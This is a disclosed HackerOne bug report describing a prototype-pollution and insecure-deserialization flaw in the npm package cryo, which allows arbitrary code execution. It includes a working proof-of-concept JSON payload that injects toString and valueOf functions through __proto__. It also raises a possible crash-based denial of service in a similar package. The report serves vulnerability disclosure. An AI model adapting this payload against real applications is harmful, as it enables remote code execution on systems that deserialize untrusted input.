# Insecure implementation of deserialization in cryo

## Report Details
- **Report ID**: 350418
- **URL**: https://hackerone.com/reports/350418
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-11T12:05:58.528Z
- **Disclosed**: 2018-06-19T15:51:37.020Z

## Reporter
- **Username**: greendog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report code injection in serialization package cryo
It allows execute arbitrary code using custom prototype.

# Module

**module name:** cryo
**version:** 0.0.6
**npm page:** `https://www.npmjs.com/package/cryo`

## Module Description

JSON on steroids.
Built for node.js and browsers. Cryo is inspired by Python's pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:

## Module Stats

37 downloads in the last week

# Vulnerability

## Vulnerability Description

If an application uses "cryo" package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.

To reconstruct an object from JSON, cryo uses square bracket notation ( `obj[key]=value` ). So there is an opportunity for an attacker to change `__proto__` property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.
It means that if later in the code the application interacts with the new object in the way which leads to invocation of the object's prototype functions, then the attacker malicious code are executed.


## Steps To Reproduce:

PoC:
```
var Cryo = require('cryo');
var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
var hydrated = Cryo.parse(frozen);
console.log(hydrated);
```
console.log internally calls hydrated's vauleOf method, so an attacker's code are executed and we can see "defconrussia" in console.

## Patch

I suggest to blacklist "__proto__" property in deserialization process.

## Supporting Material/References:

- Ubuntu 16.04
- node v6.11.3
- npm 5.5.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N


> Hunter's comments and funny memes goes here
Also I found a couple of other modules (for example, https://www.npmjs.com/package/kaiser)  which use square bracket notation too, so it's possible to rewrite `__proto__` with them too. But us they don't support serialization of functions, we cannot use the same attack as described here. Still we can set wrong values for prototype's methods, so if an application tries to convert a new object (deserialized from JSON) to string, it may crash with a TypeError exception.
It could be a kind of DoS.  What do you think if I should create similar reports for such cases?

## Impact

An attacker can craft a special JSON file with malicious code which rewrites `__proto__` of a new object. In some circumstances it may lead to execution of the code, so the attacker can achieve OS command execution.

## Attachments
No attachments
